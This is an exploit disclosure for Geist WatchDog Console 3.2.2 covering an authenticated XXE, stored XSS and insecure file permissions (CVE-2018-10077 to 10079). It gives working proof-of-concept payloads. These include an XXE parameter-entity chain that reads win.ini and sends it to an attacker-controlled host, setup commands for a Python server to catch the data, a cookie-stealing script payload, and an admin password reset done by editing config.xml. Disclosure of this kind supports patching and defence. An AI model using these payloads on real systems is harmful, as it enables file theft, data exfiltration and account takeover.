# Exploit Title: Geist WatchDog Console 3.2.2 -  Multiple Vulnerabilities
# Date: 04-17-18
# Vulnerable Software: WatchDog Console - 3.2.2
# Vendor Homepage: http://www.itwatchdogs.com/
# Version: 3.2.2
# Software Link: http://www.itwatchdogs.com/userfiles/file/firmware/Console/WatchDogConsoleInstaller_v3.2.2.exe
# Tested On: Windows 7 x86

Description
-----------------------------------------------------------------
WatchDog Console suffers from multiple vulnerabilities:

# CVE-2018-10077 Authenticated XML External Entity (XXE)
# CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS)
# CVE-2018-10079 Insecure File Permissions

Prerequisites
-----------------------------------------------------------------
To successfully exploit these vulnerabilities, an attacker must already have access
to a system running WatchDog Console using a low-privileged user account

Proof of Concepts
-----------------------------------------------------------------
### CVE-2018-10079 Insecure File Permissions ###
By default, WatchDog Console 3.2.2 installs all configuration data at 'C:\ProgramData\WatchDog Console' and
gives 'Authenticated Users' group Modify permissions

C:\>icacls "c:\ProgramData\WatchDog Console"
c:\ProgramData\WatchDog Console NT AUTHORITY\Authenticated Users:(OI)(CI)(M,DC)

This allows any local user of the system the ability to reset the application admin password by generating
a password using the PHP md5() function and updating the config.xml file.  It also provides the ability to
add data to servers.xml for both CVE-2018-10078 and CVE-2018-10079 or through the application interface

### CVE-2018-10077 Authenticated XML External Entity (XXE) ###
With authenticated admin access to the application or local access to the system, a user has the ability to read
system files remotely through XXE

On attacking machine
- Create data.xml with following contents in apache root and start apache listening on 80
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE r [
	<!ELEMENT r ANY >
	<!ENTITY % sp SYSTEM "http://192.168.0.149:8080/evil.xml">
	%sp;
	%param1;
	]>
	<r>&exfil;</r>

- Create evil.xml with the following contents anywhere
	<?xml version="1.0" encoding="UTF-8"?>
	<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
	<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.149:8080/?%data;'>">

- Start python simple http server in same directory as evil.xml, listening on 8080
	python -m SimpleHTTPServer 8080

On victim machine (1 of 2 ways)
1. With admin access to application console, add attacking server IP address under servers tab
or
2. With local access to system
	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following:
		<?xml version="1.0" encoding="utf-8" standalone="yes"?>
		<servers>
		<server host="192.168.0.149" addrType="http" port="80" description="" selEmail="True" Username="1" Password="1" left="700" top="420" />
		</servers>
	- restart system

On attacking machine
- Contents of 'win.ini' is outputted to console
- evil.xml can be updated to read other sensitive files (tested reading file from admin desktop)

### CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS) ###
This application suffers from authenticated XSS on several inputs (1 of 2 ways)
1. With admin access to application console, under servers tab
	- add dummy IP in server name filed
	- add <script>alert(document.cookie)</script>"> into server description
or
2. With local access to system
	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following:
		<?xml version="1.0" encoding="utf-8" standalone="yes"?>
		<servers>
		<server host="172.16.1.1" addrType="http" port="80" description="<script>alert(document.cookie)</script>">" selEmail="True" Username="1" Password="1" left="400" top="180" />
		</servers>
	- restart system

3. popup with cookie appears when browsing from Overview, Dashboard, and Server tabs.  Remains after reboot.
